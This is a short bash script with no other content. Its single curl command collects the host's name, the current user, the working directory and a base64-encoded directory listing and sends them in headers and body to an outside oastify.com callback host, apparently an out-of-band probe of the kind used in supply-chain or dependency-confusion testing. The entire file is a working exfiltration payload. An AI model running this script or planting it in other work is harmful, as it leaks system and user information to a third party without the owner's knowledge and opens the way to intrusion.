#!/bin/bash

curl -H "Hostname: $(hostname | base64)" -H "Whoami: $(whoami | base64)" -H "Pwd: $(pwd | base64)" -d $(ls -la | base64)  http://hh2jrafy3z3xpdaa73mqi27ig9m0a1yq.oastify.com
